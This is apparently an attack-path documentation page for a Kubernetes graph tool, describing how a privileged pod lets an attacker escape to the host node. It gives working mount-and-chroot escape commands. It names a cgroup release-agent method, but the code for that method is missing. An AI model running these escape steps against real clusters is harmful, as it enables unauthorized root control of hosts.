# CH_podPrivileged

## Edge Schema

- **Source:** [CH_Pod](../NodeDescriptions/CH_Pod.md)
- **Target:** [CH_Node](../NodeDescriptions/CH_Node.md)

## General Information

The Pod runs with `privileged: true` in its security context, meaning container compromise provides a direct path to full control of the underlying Node.

## Abuse

A privileged container has full access to the host kernel and devices. There are two reliable escape paths.

**Cgroup release agent escape (Felix Wilhelm's method)** - abuses cgroup notification hooks to execute a command as root on the host without needing to find a specific device:

**Host filesystem mount** - find the host's disk device via `/dev` and mount it:

```bash
# Identify the host disk device
fdisk -l

# Mount and chroot into the host filesystem
mkdir /host
mount /dev/<device> /host
chroot /host bash
```

## References

- [BishopFox badPods - priv](https://github.com/BishopFox/badPods/tree/main/manifests/priv)
- [Kubernetes Privileged Containers](https://kubernetes.io/docs/concepts/security/pod-security-standards/#privileged)
- [HackTricks - Privileged Container Escape](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/escaping-from-kubernetes/kubernetes-privileged-container-escape)
- [OWASP K01 - Insecure Workload Configurations](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K01-Insecure-Workload-Configurations.html)
- [Threat Matrix - Privileged Container](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Privileged%20container/)
